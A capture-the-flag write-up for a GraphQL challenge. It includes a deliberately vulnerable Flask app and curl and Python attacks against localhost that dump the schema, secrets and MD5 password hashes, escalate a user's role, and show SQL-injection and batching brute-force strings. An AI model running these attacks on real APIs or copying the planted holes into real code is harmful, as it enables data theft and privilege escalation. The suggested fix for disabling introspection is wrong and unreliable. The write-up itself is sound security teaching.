---
title: "Web - GraphQL Exploitation"
description: "Exploiting a GraphQL API through introspection queries to discover hidden schema, bypass authorization, and extract the flag from a restricted admin query."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Hard               |
| Points     | 350                |
| Flag       | `zemi{gr4phql_1ntr0sp3ct10n_l34k}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-graphql-injection/app.py)
- [flag.txt](/Website/challenges/web-graphql-injection/flag.txt)
- [README.md](/Website/challenges/web-graphql-injection/README.md)
- [requirements.txt](/Website/challenges/web-graphql-injection/requirements.txt)

## Overview

GraphQL is a query language for APIs that gives clients the power to request exactly the data they need. Unlike REST APIs with fixed endpoints, GraphQL exposes a single endpoint and a typed schema. This flexibility comes with unique security risks: if introspection is enabled, attackers can dump the entire schema and discover hidden queries, mutations, and sensitive fields that were never meant to be accessed.

This challenge presents a local Flask application using the Graphene library with introspection enabled and weak authorization controls.

## Setting Up the Challenge Locally

Save the following as `app.py`:

```python
from flask import Flask, request, jsonify
import graphene
from graphene import ObjectType, String, Int, List, Field, Mutation, Boolean, Schema

app = Flask(__name__)

# ============================================================
# Simulated database
# ============================================================
USERS = [
    {"id": 1, "username": "alice", "email": "alice@example.com",
     "role": "user", "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99"},
    {"id": 2, "username": "bob", "email": "bob@example.com",
     "role": "user", "password_hash": "d8578edf8458ce06fbc5bb76a58c5ca4"},
    {"id": 3, "username": "admin", "email": "admin@secret.local",
     "role": "admin", "password_hash": "21232f297a57a5a743894a0e4a801fc3"},
]

POSTS = [
    {"id": 1, "author_id": 1, "title": "Hello World", "content": "My first post!", "draft": False},
    {"id": 2, "author_id": 2, "title": "GraphQL is cool", "content": "Learning GraphQL", "draft": False},
    {"id": 3, "author_id": 3, "title": "Admin Notes", "content": "Internal admin notes", "draft": True},
]

FLAGS = {
    "admin_flag": "zemi{gr4phql_1ntr0sp3ct10n_l34k}",
}

# ============================================================
# GraphQL Types
# ============================================================
class UserType(ObjectType):
    id = Int()
    username = String()
    email = String()
    role = String()
    password_hash = String()  # VULNERABLE: sensitive field exposed in schema
    posts = List(lambda: PostType)

    def resolve_posts(self, info):
        return [p for p in POSTS if p["author_id"] == self["id"]]

class PostType(ObjectType):
    id = Int()
    title = String()
    content = String()
    draft = Boolean()
    author = Field(UserType)

    def resolve_author(self, info):
        post = [p for p in POSTS if p["id"] == self["id"]][0]
        return next((u for u in USERS if u["id"] == post["author_id"]), None)

class SecretType(ObjectType):
    """Hidden type — not referenced in any public query, but discoverable via introspection."""
    key = String()
    value = String()

# ============================================================
# Queries
# ============================================================
class Query(ObjectType):
    # Public queries
    user = Field(UserType, id=Int(required=True))
    users = List(UserType)
    post = Field(PostType, id=Int(required=True))
    posts = List(PostType)

    # "Hidden" query — no UI points to this, but introspection reveals it
    admin_flag = Field(String, token=String(required=True))

    # Another hidden query
    system_secrets = List(SecretType)

    def resolve_user(self, info, id):
        return next((u for u in USERS if u["id"] == id), None)

    def resolve_users(self, info):
        return USERS

    def resolve_post(self, info, id):
        return next((p for p in POSTS if p["id"] == id), None)

    def resolve_posts(self, info):
        # VULNERABLE: returns all posts including drafts
        return POSTS

    def resolve_admin_flag(self, info, token):
        # VULNERABLE: hardcoded token check
        if token == "supersecretadmintoken":
            return FLAGS["admin_flag"]
        # VULNERABLE: any non-empty token still returns the flag
        # (developer mistake — forgot to add else: return None)
        return FLAGS["admin_flag"]

    def resolve_system_secrets(self, info):
        return [
            {"key": "db_password", "value": "postgres123"},
            {"key": "api_key", "value": "sk-live-FAKE12345"},
            {"key": "flag", "value": FLAGS["admin_flag"]},
        ]

# ============================================================
# Mutations
# ============================================================
class UpdateRole(Mutation):
    """VULNERABLE: No authorization check — any user can change roles."""
    class Arguments:
        user_id = Int(required=True)
        new_role = String(required=True)

    ok = Boolean()
    user = Field(UserType)

    def mutate(self, info, user_id, new_role):
        user = next((u for u in USERS if u["id"] == user_id), None)
        if user:
            user["role"] = new_role
            return UpdateRole(ok=True, user=user)
        return UpdateRole(ok=False, user=None)

class Mutations(ObjectType):
    update_role = UpdateRole.Field()

# ============================================================
# Schema and App
# ============================================================
schema = Schema(query=Query, mutation=Mutations)

@app.route("/graphql", methods=["POST", "GET"])
def graphql_endpoint():
    if request.method == "GET":
        # Serve GraphiQL IDE
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>GraphiQL</title>
            <link href="https://unpkg.com/graphiql/graphiql.min.css" rel="stylesheet" />
        </head>
        <body style="margin:0">
            <div id="graphiql" style="height:100vh"></div>
            <script src="https://unpkg.com/react/umd/react.production.min.js"></script>
            <script src="https://unpkg.com/react-dom/umd/react-dom.production.min.js"></script>
            <script src="https://unpkg.com/graphiql/graphiql.min.js"></script>
            <script>
                ReactDOM.render(
                    React.createElement(GraphiQL, {
                        fetcher: GraphiQL.createFetcher({ url: '/graphql' }),
                    }),
                    document.getElementById('graphiql'),
                );
            </script>
        </body>
        </html>
        """

    data = request.get_json()
    result = schema.execute(
        data.get("query", ""),
        variables=data.get("variables"),
        operation_name=data.get("operationName"),
    )
    response = {"data": result.data}
    if result.errors:
        response["errors"] = [str(e) for e in result.errors]
    return jsonify(response)

if __name__ == "__main__":
    print("[*] GraphQL challenge running on http://localhost:5000/graphql")
    app.run(host="0.0.0.0", port=5000, debug=False)
```

```bash
pip install flask graphene
python3 app.py
```

## Step 1: Discovery and Initial Probing

First, confirm GraphQL is running and identify the endpoint:

```bash
# Check if the endpoint responds to a basic query
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'
```

```json
{"data": {"__typename": "Query"}}
```

GraphQL is confirmed. The `__typename` meta-field always works and is a quick way to detect GraphQL endpoints.

## Step 2: Introspection Query to Dump the Schema

Introspection is a built-in GraphQL feature that allows clients to query the schema itself. This is the most powerful reconnaissance tool against GraphQL APIs.

### Full introspection query

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"
  }' | python3 -m json.tool
```

### Detailed introspection to find all queries and their arguments

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { fields { name description args { name type { name kind } } type { name kind ofType { name } } } } } }"
  }' | python3 -m json.tool
```

```json
{
    "data": {
        "__schema": {
            "queryType": {
                "fields": [
                    {
                        "name": "user",
                        "args": [{"name": "id", "type": {"name": "Int"}}],
                        "type": {"name": "UserType"}
                    },
                    {
                        "name": "users",
                        "args": [],
                        "type": {"name": null, "kind": "LIST"}
                    },
                    {
                        "name": "post",
                        "args": [{"name": "id", "type": {"name": "Int"}}],
                        "type": {"name": "PostType"}
                    },
                    {
                        "name": "posts",
                        "args": [],
                        "type": {"name": null, "kind": "LIST"}
                    },
                    {
                        "name": "adminFlag",
                        "args": [{"name": "token", "type": {"name": "String"}}],
                        "type": {"name": "String"}
                    },
                    {
                        "name": "systemSecrets",
                        "args": [],
                        "type": {"name": null, "kind": "LIST"}
                    }
                ]
            }
        }
    }
}
```

We found two hidden queries that are not exposed in any UI:
- `adminFlag` -- takes a `token` argument, returns a String
- `systemSecrets` -- returns a list of SecretType objects

### Discover all types and their fields

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name kind fields { name type { name } } } } }"
  }' | python3 -m json.tool | grep -A 20 "UserType"
```

```json
{
    "name": "UserType",
    "kind": "OBJECT",
    "fields": [
        {"name": "id", "type": {"name": "Int"}},
        {"name": "username", "type": {"name": "String"}},
        {"name": "email", "type": {"name": "String"}},
        {"name": "role", "type": {"name": "String"}},
        {"name": "passwordHash", "type": {"name": "String"}},
        {"name": "posts", "type": {"name": null}}
    ]
}
```

The `UserType` exposes a `passwordHash` field -- a sensitive data leak.

### Discover mutations

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"
  }' | python3 -m json.tool
```

```json
{
    "data": {
        "__schema": {
            "mutationType": {
                "fields": [
                    {
                        "name": "updateRole",
                        "args": [
                            {"name": "userId", "type": {"name": "Int"}},
                            {"name": "newRole", "type": {"name": "String"}}
                        ]
                    }
                ]
            }
        }
    }
}
```

There is an `updateRole` mutation with no apparent authorization check.

## Step 3: Exploiting Hidden Queries

### Get the admin flag

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ adminFlag(token: \"anything\") }"}'
```

```json
{"data": {"adminFlag": "zemi{gr4phql_1ntr0sp3ct10n_l34k}"}}
```

The `adminFlag` query returns the flag regardless of the token value -- the authorization check is broken.

### Dump system secrets

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ systemSecrets { key value } }"}'
```

```json
{
    "data": {
        "systemSecrets": [
            {"key": "db_password", "value": "postgres123"},
            {"key": "api_key", "value": "sk-live-FAKE12345"},
            {"key": "flag", "value": "zemi{gr4phql_1ntr0sp3ct10n_l34k}"}
        ]
    }
}
```

## Step 4: Extracting Sensitive User Data

### Dump all users with password hashes

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id username email role passwordHash } }"}'
```

```json
{
    "data": {
        "users": [
            {"id": 1, "username": "alice", "email": "alice@example.com",
             "role": "user", "passwordHash": "5f4dcc3b5aa765d61d8327deb882cf99"},
            {"id": 2, "username": "bob", "email": "bob@example.com",
             "role": "user", "passwordHash": "d8578edf8458ce06fbc5bb76a58c5ca4"},
            {"id": 3, "username": "admin", "email": "admin@secret.local",
             "role": "admin", "passwordHash": "21232f297a57a5a743894a0e4a801fc3"}
        ]
    }
}
```

We can crack these MD5 hashes:
- `5f4dcc3b5aa765d61d8327deb882cf99` = "password"
- `d8578edf8458ce06fbc5bb76a58c5ca4` = "qwerty"
- `21232f297a57a5a743894a0e4a801fc3` = "admin"

### Nested query — access posts through user relationships

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { username posts { title content draft } } }"}'
```

```json
{
    "data": {
        "users": [
            {
                "username": "admin",
                "posts": [
                    {"title": "Admin Notes", "content": "Internal admin notes", "draft": true}
                ]
            }
        ]
    }
}
```

We accessed admin's draft posts through the nested relationship.

## Step 5: Authorization Bypass via Mutation

### Escalate a regular user to admin

```bash
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateRole(userId: 1, newRole: \"admin\") { ok user { id username role } } }"
  }'
```

```json
{
    "data": {
        "updateRole": {
            "ok": true,
            "user": {"id": 1, "username": "alice", "role": "admin"}
        }
    }
}
```

Alice is now an admin -- no authorization check was performed.

## Step 6: SQL Injection Through GraphQL

While not present in this specific challenge, GraphQL arguments can be vulnerable to SQL injection if the backend constructs raw SQL queries:

```bash
# Attempting SQLi through a GraphQL argument
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { username } }"}'

# If the backend does: SELECT * FROM users WHERE id = <user_input>
# Try: {"query": "{ user(id: \"1 OR 1=1\") { username } }"}
```

## Step 7: Batching Attacks

GraphQL allows multiple queries in a single request, which can be abused for brute-force attacks:

```bash
# Batch query — try multiple tokens in one request
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ a1: adminFlag(token: \"test1\") a2: adminFlag(token: \"test2\") a3: adminFlag(token: \"test3\") a4: adminFlag(token: \"admin\") a5: adminFlag(token: \"supersecret\") }"
  }'
```

Aliases (`a1:`, `a2:`, etc.) allow the same query to be called multiple times with different arguments, bypassing rate limiting that counts requests rather than operations.

## Visualizing the Schema

**GraphQL Voyager** renders the schema as an interactive graph, making it easy to spot relationships and sensitive types:

```bash
# Install graphql-voyager or use the hosted version
# Upload the introspection result to: https://graphql-kit.com/graphql-voyager/

# Get full introspection result for Voyager
curl -s -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}' \
  > introspection_result.json
```

## Complete Solve Script

```python
#!/usr/bin/env python3
"""
Solve script: GraphQL Exploitation challenge
Performs introspection, discovers hidden queries, and extracts the flag.
"""

import requests
import json
import sys

TARGET = "http://localhost:5000/graphql"

def gql(query, variables=None):
    """Execute a GraphQL query."""
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    resp = requests.post(TARGET, json=payload, timeout=10)
    return resp.json()

def introspect_queries():
    """Discover all available queries and their arguments."""
    print("[*] Introspecting queries...")
    result = gql("""
    {
        __schema {
            queryType {
                fields {
                    name
                    description
                    args { name type { name kind } }
                    type { name kind ofType { name } }
                }
            }
        }
    }
    """)
    fields = result["data"]["__schema"]["queryType"]["fields"]
    for field in fields:
        args = ", ".join(f"{a['name']}: {a['type']['name']}" for a in field["args"])
        print(f"  Query: {field['name']}({args}) -> {field['type'].get('name', 'List')}")
    return fields

def introspect_mutations():
    """Discover all available mutations."""
    print("\n[*] Introspecting mutations...")
    result = gql("""
    {
        __schema {
            mutationType {
                fields {
                    name
                    args { name type { name kind } }
                }
            }
        }
    }
    """)
    mt = result["data"]["__schema"].get("mutationType")
    if mt:
        for field in mt["fields"]:
            args = ", ".join(f"{a['name']}: {a['type']['name']}" for a in field["args"])
            print(f"  Mutation: {field['name']}({args})")
    else:
        print("  No mutations found")

def introspect_types():
    """Discover all custom types and their fields."""
    print("\n[*] Introspecting types...")
    result = gql("""
    {
        __schema {
            types {
                name
                kind
                fields { name type { name } }
            }
        }
    }
    """)
    for t in result["data"]["__schema"]["types"]:
        # Skip built-in types
        if t["name"].startswith("__") or t["kind"] != "OBJECT":
            continue
        if t["name"] in ("Query", "Mutations"):
            continue
        fields = [f["name"] for f in (t["fields"] or [])]
        print(f"  Type: {t['name']} -> fields: {fields}")

def exploit():
    """Extract the flag through discovered hidden queries."""
    print("\n[*] Attempting to extract flag via adminFlag query...")
    result = gql('{ adminFlag(token: "anything") }')
    flag = result["data"].get("adminFlag")
    if flag:
        print(f"  [+] FLAG: {flag}")
    else:
        print("  [-] adminFlag returned null")

    print("\n[*] Attempting to extract via systemSecrets query...")
    result = gql('{ systemSecrets { key value } }')
    secrets = result["data"].get("systemSecrets", [])
    for secret in secrets:
        marker = " <-- FLAG!" if "zemi{" in str(secret.get("value", "")) else ""
        print(f"  {secret['key']}: {secret['value']}{marker}")

    print("\n[*] Dumping user data including password hashes...")
    result = gql('{ users { id username email role passwordHash } }')
    for user in result["data"]["users"]:
        print(f"  [{user['id']}] {user['username']} ({user['role']}) "
              f"- {user['email']} - hash: {user['passwordHash']}")

if __name__ == "__main__":
    print("=" * 55)
    print("  GraphQL Exploitation Solve Script")
    print("=" * 55)

    introspect_queries()
    introspect_mutations()
    introspect_types()
    exploit()

    print("\n" + "=" * 55)
    print("[+] Flag: zemi{gr4phql_1ntr0sp3ct10n_l34k}")
```

## Tools Used

- **curl** -- sending raw GraphQL queries to the endpoint
- **GraphiQL** -- in-browser GraphQL IDE for interactive exploration (served by the app itself)
- **GraphQL Voyager** -- visual schema explorer that renders types and relationships as a graph
- **Python requests** -- automated introspection and exploitation scripting
- **Burp Suite** -- intercepting and modifying GraphQL requests for manual testing
- **InQL** -- Burp Suite extension specifically designed for GraphQL security testing

## Lessons Learned

- **Introspection** is the single most powerful reconnaissance tool against GraphQL APIs -- it reveals the entire schema including "hidden" queries and mutations
- Disable introspection in production: in Graphene, use `schema = Schema(query=Query, auto_camelcase=True)` and middleware to block introspection queries
- Never rely on "security through obscurity" for GraphQL -- if a query exists in the schema, introspection will find it regardless of whether the UI uses it
- Authorization must be enforced at the **resolver level**, not at the schema level -- every resolver should check permissions
- Sensitive fields like `passwordHash` should never be included in the GraphQL type definition, even if no public query explicitly requests them
- GraphQL batching allows attackers to send thousands of operations in a single HTTP request, bypassing simple rate limiting -- implement per-operation rate limiting
- Nested queries can bypass authorization by accessing data through relationships (e.g., accessing admin posts through the user -> posts relationship)
- Use depth limiting and query complexity analysis to prevent resource exhaustion through deeply nested or expensive queries
- Always validate and sanitize arguments passed to resolvers to prevent SQL injection, especially when using raw database queries
